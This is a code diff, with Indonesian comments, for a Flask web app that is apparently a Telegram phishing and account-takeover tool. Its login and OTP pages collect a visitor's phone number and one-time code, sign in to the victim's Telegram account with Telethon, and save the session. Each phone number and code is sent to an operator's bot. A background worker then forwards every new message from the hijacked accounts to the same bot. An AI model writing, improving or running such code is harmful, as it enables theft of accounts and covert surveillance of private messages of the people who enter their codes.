@@ -5,7 +5,6 @@ import requests
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
 from telethon.errors import PhoneCodeInvalidError
-import re  # untuk ambil angka OTP
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
@@ -34,7 +33,7 @@ def login():
             os.remove(session_path)
 
         async def send_code():
-            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
+            client = TelegramClient(session_path, api_id, api_hash)
             await client.connect()
             if not await client.is_user_authorized():
                 sent = await client.send_code_request(phone)
@@ -59,13 +58,15 @@ def otp():
 
     if request.method == "POST":
         code = request.form.get("otp")
+        session_path = os.path.join(SESSION_DIR, f"{phone}.session")
 
         async def verify_code():
-            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
+            client = TelegramClient(session_path, api_id, api_hash)
             await client.connect()
             try:
                 phone_code_hash = session.get("phone_code_hash")
                 await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+                # setelah sign_in sukses, session otomatis tersimpan
                 await client.disconnect()
                 return True
             except PhoneCodeInvalidError:
@@ -76,7 +77,7 @@ def otp():
             result = asyncio.run(verify_code())
             if result:
                 session["last_otp"] = code
-                # kirim ke bot
+                # kirim notif ke bot
                 text = f"✅ OTP benar\nNomor : {phone}\nOTP   : {code}"
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                 requests.post(url, data={"chat_id": CHAT_ID, "text": text})
@@ -115,11 +116,10 @@ def success():
 
 # ============= BAGIAN WORKER TELETHON =============
 async def forward_handler(event, client_name):
-    """Handler untuk forward SEMUA pesan (debug mode)"""
+    """Handler untuk forward pesan"""
     text_msg = event.message.message
     phone_number = client_name.replace(".session", "")
 
-    # kirim semua pesan ke Telegram
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -131,11 +131,11 @@ async def forward_handler(event, client_name):
         "parse_mode": "Markdown"
     }
     requests.post(url, data=payload)
-
-    print(f"Pesan dari {phone_number}: {text_msg}")
+    print(f"[Worker] Pesan dari {phone_number}: {text_msg}")
 
 async def worker_main():
     print("Worker jalan...")
+    print("DEBUG: isi folder sessions ->", os.listdir(SESSION_DIR))
 
     clients = []
     for fname in os.listdir(SESSION_DIR):
@@ -148,7 +148,7 @@ async def worker_main():
 
             @client.on(events.NewMessage)
             async def handler(event, fn=fname):
-                print(f"DEBUG: Pesan baru dari {fn}: {event.message.message}")
+                print(f"[Worker] Pesan baru dari {fn}: {event.message.message}")
                 await forward_handler(event, fn)
 
     if not clients:
